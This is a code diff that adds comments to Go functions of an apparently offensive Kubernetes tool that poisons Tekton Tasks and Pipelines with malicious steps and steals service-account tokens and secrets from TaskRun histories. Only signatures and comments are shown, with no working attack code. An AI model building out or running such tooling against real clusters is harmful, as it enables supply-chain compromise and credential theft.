@@ -24,6 +24,7 @@ var (
 	}
 )
 
+// PoisonTektonTask injects a malicious init step into a Tekton Task that executes before legitimate steps.
 func PoisonTektonTask(ctx context.Context, dynClient dynamic.Interface, ns, taskName, image, command string) (*PoisonResult, error) {
 	result := &PoisonResult{
 		Platform: "tekton",
@@ -72,6 +73,7 @@ func PoisonTektonTask(ctx context.Context, dynClient dynamic.Interface, ns, task
 	return result, nil
 }
 
+// PoisonTektonPipeline injects a malicious task at the beginning of a Tekton Pipeline definition.
 func PoisonTektonPipeline(ctx context.Context, dynClient dynamic.Interface, ns, pipelineName, image, command string) (*PoisonResult, error) {
 	result := &PoisonResult{
 		Platform: "tekton",
@@ -122,6 +124,7 @@ func PoisonTektonPipeline(ctx context.Context, dynClient dynamic.Interface, ns, 
 	return result, nil
 }
 
+// ListTektonResources enumerates Tasks, Pipelines, and TaskRuns in the given namespace.
 func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
 	var sb strings.Builder
 
@@ -153,6 +156,7 @@ func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns st
 	return sb.String(), nil
 }
 
+// StealTektonSecrets extracts service account tokens and sensitive parameters from TaskRun histories.
 func StealTektonSecrets(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
 	runs, err := ListCRDs(ctx, dynClient, tektonTaskRunGVR, ns)
 	if err != nil {
